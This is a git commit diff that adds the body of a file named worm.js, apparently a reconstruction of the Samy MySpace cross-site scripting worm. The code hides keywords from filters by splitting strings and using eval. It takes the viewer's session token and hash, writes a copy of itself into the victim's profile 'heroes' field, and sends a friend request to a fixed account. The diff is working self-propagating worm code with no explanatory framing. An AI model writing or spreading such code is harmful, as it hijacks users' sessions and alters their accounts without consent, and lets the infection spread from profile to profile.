603e25a8fd01899cf6ed1131cb533db17a14c9be
must108 <mustaeen18@gmail.com>
2024-12-08 11:27:25 -0500

    progress

--- worm.js
+++ worm.js
@@ -52,3 +52,152 @@ if (location.hostname == 'profile.myspace.com') {
 function getClientFID() {
     return findIn(g(), 'up_launchIC( ' + A, A);
 }
+
+function nothing() {}
+
+function paramsToString(AV) {
+    var N = new String();
+    var O = 0;
+    for (var P in AV) {
+        if (O > 0) {
+            N += '&';
+        }
+        var Q = escape(AV[P]);
+        while (Q.indexOf('+') != -1) {
+            Q = Q.replace('+', '%2B');
+        }
+
+        while (Q.indexOf('&') != -1) {
+            Q = Q.replace('&', '%26');
+        }
+
+        N += P + '=' + Q;
+        O++;
+    }
+
+    return N;
+}
+
+function httpSend(BH, BI, BJ, BK) {
+    if (!J) {
+        return false;
+    }
+
+    eval('J.onr' + 'eadystatechange=BI');
+    J.open(BJ, BH,true);
+    if (BJ == 'POST') {
+        J.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        J.setRequestHeader('Content-Length', BK.length);
+    }
+    J.send(BK);
+    return true;
+}
+
+function findIn(BF, BB, BC) {
+    var R = BF.indexOf(BB) + BB.length;
+    var S = BF.substring(R, R + 1024);
+    return S.substring(0, S.indexOf(BC));
+}
+
+function getHiddenParameter(BF, BG) {
+    return findIn(BF, 'name=' + B + BG + B + ' value=' + B, B);
+}
+
+function getFromURL(BF, BG) {
+    var T;
+    if (BG == "Mytoken") {
+        T = B;
+    } else {
+        T = '&';
+    }
+    var U = BG + '=';
+    var V = BF.indexOf(U) + U.length;
+    var W = BF.substring(V, V + 1024);
+    var X = W.indexOf(T);
+    var Y = W.substring(0, X);
+    return Y;
+}
+
+function getXMLObj() {
+    var Z = false;
+    if (window.XMLHttpRequest) {
+        try {
+            Z = new XMLHttpRequest();
+        } catch (e) {
+            Z = false;
+        }
+    } else if (window.ActiveXObject) {
+        try {
+            Z = new ActiveXObject('Msxml2.XMLHTTP');
+        } catch (e) {
+            try {
+                Z = new ActiveXObject('Microsoft.XMLHTTP');
+            } catch (e) {
+                Z = false;
+            }
+        }
+    }
+    return Z;
+}
+
+var AA = g();
+var AB = AA.indexOf('m' + 'ycode');
+var AC = AA.substring(AB, AB + 4096);
+var AD = AC.indexOf('D' + 'IV');
+var AE = AC.substring(0, AD);
+var AF;
+
+if (AE) {
+    AE = AE.replace('jav', 'a', A + 'jav' + 'a');
+    AE = AE.replace('exp' + 'r)', 'exp' + 'r)' + A);
+    AF = ' but most of all, samy is my hero. <d' + 'iv id=' + AE + 'D' + 'IV>';
+}
+
+var AG;
+
+function getHome() {
+    if (J.readyState != 4) {
+        return;
+    }
+
+    var AU = J.responseText;
+    AG = findIn(AU, 'P' + 'rofileHeroes', '</td>');
+    AG = AG.substring(61, AG.length);
+    if(AG.indexOf('samy') == -1) {
+        if (AF) {
+            AG += AF;
+            var AR = getFromURL(AU, 'Mytoken');
+            var AS = new Array();
+            AS['interestLabel'] = 'heroes';
+            AS['submit'] = 'Preview';
+            AS['interest'] = AG;
+            J = getXMLObj();
+            httpSend('/index.cfm?fuseaction=profile.previewInterests&Mytoken=' + AR, postHero, 'POST', paramsToString(AS));
+        }
+    }
+}
+
+function postHero() {
+    if (J.readyState != 4) {
+        return;
+    }
+
+    var AU = J.responseText;
+    var AR = getFromURL(AU, 'Mytoken');
+    var AS = new Array();
+    AS['interestLabel'] = 'heroes';
+    AS['submit'] = 'Submit';
+    AS['interest'] = AG;
+    AS['hash'] = getHiddenParameter(AU, 'hash');
+    httpSend('/index.cfm?fuseaction=profile.processInterests&MyToken=' + AR, nothing, 'POST', paramsToString(AS));
+}
+
+function main() {
+    var AN = getClientFID();
+    var BH = '/index.cfm?fuseaction=user.viewProfile&friendID=' + AN + '&Mytoken=' + L;
+    J = getXMLObj();
+    httpSend(BH, getHome, 'GET');
+    xmlhttp2 = getXMLObj();
+    httpSend2('/index.cfm?fuseaction=invite.addfriend_verify&friendID=11851658&Mytoken=' + L, processxForm, 'GET');
+}
+
